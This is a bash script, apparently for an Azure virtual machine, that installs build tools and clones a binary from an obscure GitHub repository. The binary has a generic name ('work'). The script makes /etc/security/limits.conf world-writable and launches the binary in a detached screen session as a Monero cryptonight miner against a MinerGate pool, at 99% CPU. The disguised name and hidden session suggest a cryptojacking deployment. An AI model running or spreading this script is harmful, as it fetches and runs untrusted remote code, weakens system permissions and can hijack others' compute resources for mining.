#!/bin/bash

sudo bash
rm /var/lib/dpkg/lock
rm /var/lib/dpkg/lock-frontend
dpkg --configure -a
apt-get -y install screen git build-essential libuv1-dev libmicrohttpd-dev libssl-dev
git clone https://github.com/dderqw/jdfe.git /home/azureuser/jdfe
chmod 775 /home/azureuser/jdfe/work--16-04--2-10-0
sysctl -w vm.nr_hugepages=128
chmod ugo+rwx /etc/security/limits.conf
echo 'soft memlock 262144' >> /etc/security/limits.conf
echo 'hard memlock 262144' >> /etc/security/limits.conf
sysctl -p
screen -d -m /home/azureuser/jdfe/work -a cryptonight -o xmr.pool.minergate.com:45700 -u $1 -p x -t $2 --av=2 --donate-level 0 --max-cpu-usage 99
